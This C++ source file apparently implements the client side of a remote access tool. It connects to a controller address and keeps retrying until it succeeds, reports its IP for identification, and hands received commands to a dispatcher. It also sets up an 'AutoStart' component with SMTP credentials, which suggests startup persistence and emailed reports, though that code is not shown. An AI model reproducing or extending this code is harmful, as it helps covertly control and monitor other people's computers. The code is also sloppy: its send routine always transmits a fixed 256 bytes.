#include "Client.h"
#pragma warning(disable:4996) 
#define SIZE_BUFFER 256

Client::Client(const char* addrp,const unsigned short &portp) : Socket_(),addr(addrp),port(portp)
{
	int val;
	this->setSock(socket(AF_INET, SOCK_STREAM, 0));

	sin.sin_addr.s_addr = inet_addr(addr);

	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
}
void Client::init(std::string smtp, std::string sender_mail, std::string sender_name, std::string password, std::string mail_rcpt, std::string rcpt_name)
{
	AutoStart auto1(this,smtp, sender_mail, sender_name, password, mail_rcpt, rcpt_name);
}
void Client::connection()
{
	std::cout << "[*] Connection to " << addr << ":" << port << std::endl;
	
	int val = connect(*(this->getSock()), (SOCKADDR *)&sin, sizeof(sin));

	while (val != 0)
	{
		Sleep(1000);
		if (val == INVALID_SOCKET)
		{
			this->setError(1);
			std::cout << "Can't reach : " << addr << ":" << port << std::endl;
		}

		val = connect(*(this->getSock()), (SOCKADDR *)&sin, sizeof(sin));

	}
	std::cout << "[*] Successfuly connected " << std::endl;
	send_b(Ip.c_str()); // Send IP to identify

}

Client::~Client()
{}

bool Client::send_b(const char* pbuffer)
{
	if (send(*(this->getSock()), pbuffer, SIZE_BUFFER, 0) == 0)
		return 1;
	else
		return 0;
}

bool Client::recv_b()
{
	char b[SIZE_BUFFER] = { 0 };
	if ((recv(*(this->getSock()), b, sizeof(b), 0) > 0))
	{
		this->setBuffer(b);
		Factory_Client fact(this, b);
		Sleep(300);
		return 1;
	}
	else
		std::cout << "Ernno : " << errno << std::endl;
		this->setBuffer("exit");
		return 0;
}
void Client::setIp(const std::string& pIp) { Ip = pIp; }
std::string Client::getIp() const { return Ip; }
bool Client::getMute()const { return mute; }
void Client::setMute(const bool& pmute) { mute = pmute; }